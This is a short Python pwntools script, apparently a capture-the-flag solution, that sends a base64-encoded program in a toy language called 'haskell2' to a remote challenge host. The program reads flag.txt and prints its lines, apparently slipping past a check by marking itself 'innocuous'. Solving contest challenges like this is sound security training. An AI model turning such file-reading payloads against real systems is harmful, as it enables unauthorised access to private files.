#!/usr/bin/env python3

import base64

from pwn import remote


HOST = "instancer.dalctf2026.com"
PORT = 60923

PROGRAM = b'innocuous f <- read file "flag.txt"\nfor each line in f tell me line\n'


def main() -> None:
    io = remote(HOST, PORT)
    io.recvuntil(b"Send base64-encoded haskell2 program:")
    io.sendline(base64.b64encode(PROGRAM))
    data = io.recvall(timeout=5)
    print(data.decode(errors="replace"), end="")


if __name__ == "__main__":
    main()
